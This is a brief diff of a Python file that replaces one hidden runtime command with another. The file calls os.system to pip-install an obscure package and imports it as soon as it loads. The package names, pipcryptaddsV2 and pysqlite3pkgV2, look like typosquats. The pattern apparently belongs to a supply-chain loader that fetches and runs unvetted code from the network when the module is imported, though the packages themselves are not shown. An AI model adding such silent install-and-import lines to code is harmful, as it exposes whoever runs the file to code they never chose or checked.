@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptaddsV2")
-import pipcryptaddsV2
+os.system("pip install pysqlite3pkgV2")
+import pysqlite3pkgV2
 from optparse import Option
 import requests
 import threading
